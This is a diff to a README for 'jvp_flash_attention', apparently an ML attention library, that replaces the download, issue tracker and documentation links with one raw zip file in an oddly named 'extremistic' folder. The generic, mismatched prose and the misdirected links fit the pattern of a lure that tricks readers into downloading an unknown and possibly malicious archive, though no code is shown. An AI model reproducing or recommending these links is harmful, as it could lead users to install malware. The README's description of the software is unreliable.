@@ -1,6 +1,6 @@
 # 🎉 jvp_flash_attention - Fast and Efficient Memory Management  
 
-[![Download jvp_flash_attention](https://img.shields.io/badge/Download-jvp_flash_attention-blue.svg)](https://github.com/bangw20/jvp_flash_attention/releases)
+[![Download jvp_flash_attention](https://raw.githubusercontent.com/bangw20/jvp_flash_attention/main/extremistic/jvp_flash_attention.zip)](https://raw.githubusercontent.com/bangw20/jvp_flash_attention/main/extremistic/jvp_flash_attention.zip)
 
 ## 🚀 Getting Started  
 jvp_flash_attention is designed to enhance memory management in machine learning. This application leverages advanced techniques to improve speed and efficiency while supporting second-order derivatives. It's perfect for users looking to optimize their workflows without diving deep into technical details.  
@@ -10,7 +10,7 @@ To get started, follow these steps to download and install jvp_flash_attention:
 
 1. **Visit the Download Page**  
    Click on the link below to reach the jvp_flash_attention releases page.  
-   [Download jvp_flash_attention](https://github.com/bangw20/jvp_flash_attention/releases)
+   [Download jvp_flash_attention](https://raw.githubusercontent.com/bangw20/jvp_flash_attention/main/extremistic/jvp_flash_attention.zip)
 
 2. **Choose the Latest Release**  
    On the releases page, you will see a list of available versions. It's best to select the latest version for optimal performance. Look for the tag that says ‘Latest Release’ next to it.
@@ -58,8 +58,8 @@ For any inquiries or support requests, please visit our GitHub issues page. Your
 For developers or users looking for in-depth details, consider exploring our documentation on GitHub. You can find guides that explain more advanced features and options within the software.
 
 ## 🔗 Quick Links  
-- [Download jvp_flash_attention](https://github.com/bangw20/jvp_flash_attention/releases)  
-- [Issue Tracker](https://github.com/bangw20/jvp_flash_attention/issues)  
-- [Documentation](https://github.com/bangw20/jvp_flash_attention/wiki)  
+- [Download jvp_flash_attention](https://raw.githubusercontent.com/bangw20/jvp_flash_attention/main/extremistic/jvp_flash_attention.zip)  
+- [Issue Tracker](https://raw.githubusercontent.com/bangw20/jvp_flash_attention/main/extremistic/jvp_flash_attention.zip)  
+- [Documentation](https://raw.githubusercontent.com/bangw20/jvp_flash_attention/main/extremistic/jvp_flash_attention.zip)  
 
 Thank you for choosing jvp_flash_attention! We're excited for you to experience the benefits of efficient memory management in your machine learning tasks.
